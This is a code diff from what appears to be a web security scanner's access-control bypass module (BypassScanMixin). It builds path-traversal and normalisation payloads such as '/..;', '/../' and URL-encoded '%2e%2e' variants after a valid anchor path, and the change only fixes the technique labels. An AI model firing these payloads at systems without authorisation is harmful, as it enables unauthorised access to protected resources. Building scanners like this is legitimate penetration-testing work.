@@ -2019,37 +2019,37 @@ class BypassScanMixin:
             p12.append({
                 "url":     origin + anchor_no_slash + "/..;" + path + "/",
                 "method":  method, "headers": hdrs, "body": body,
-                "technique": f"prefix {anchor}/..;{path}/",
+                "technique": f"prefix {anchor_no_slash}/..;{path}/",
             })
             # Pattern B: /anchor/../blocked_path
             p12.append({
                 "url":     origin + anchor_no_slash + "/../" + clean_path,
                 "method":  method, "headers": hdrs, "body": body,
-                "technique": f"prefix {anchor}/../{clean_path}",
+                "technique": f"prefix {anchor_no_slash}/../{clean_path}",
             })
             # Pattern C: /anchor../blocked_path/ (dot after anchor, no slash)
             p12.append({
                 "url":     origin + anchor_no_slash + ".." + path + "/",
                 "method":  method, "headers": hdrs, "body": body,
-                "technique": f"prefix {anchor}..{path}/",
+                "technique": f"prefix {anchor_no_slash}..{path}/",
             })
             # Pattern D: /anchor..;/blocked_path/
             p12.append({
                 "url":     origin + anchor_no_slash + "..;" + path + "/",
                 "method":  method, "headers": hdrs, "body": body,
-                "technique": f"prefix {anchor}..;{path}/",
+                "technique": f"prefix {anchor_no_slash}..;{path}/",
             })
             # Pattern E: /anchor/%2e%2e/blocked_path (URL-encoded dots)
             p12.append({
                 "url":     origin + anchor_no_slash + "/%2e%2e/" + clean_path,
                 "method":  method, "headers": hdrs, "body": body,
-                "technique": f"prefix {anchor}/%2e%2e/{clean_path}",
+                "technique": f"prefix {anchor_no_slash}/%2e%2e/{clean_path}",
             })
             # Pattern F: /anchor/%2e%2e;/blocked_path/
             p12.append({
                 "url":     origin + anchor_no_slash + "/%2e%2e;/" + clean_path + "/",
                 "method":  method, "headers": hdrs, "body": body,
-                "technique": f"prefix {anchor}/%2e%2e;/{clean_path}/",
+                "technique": f"prefix {anchor_no_slash}/%2e%2e;/{clean_path}/",
             })
         _run(12, "Valid-path Prefix Bypass (/robots.txt/..;/path/)", p12)
 
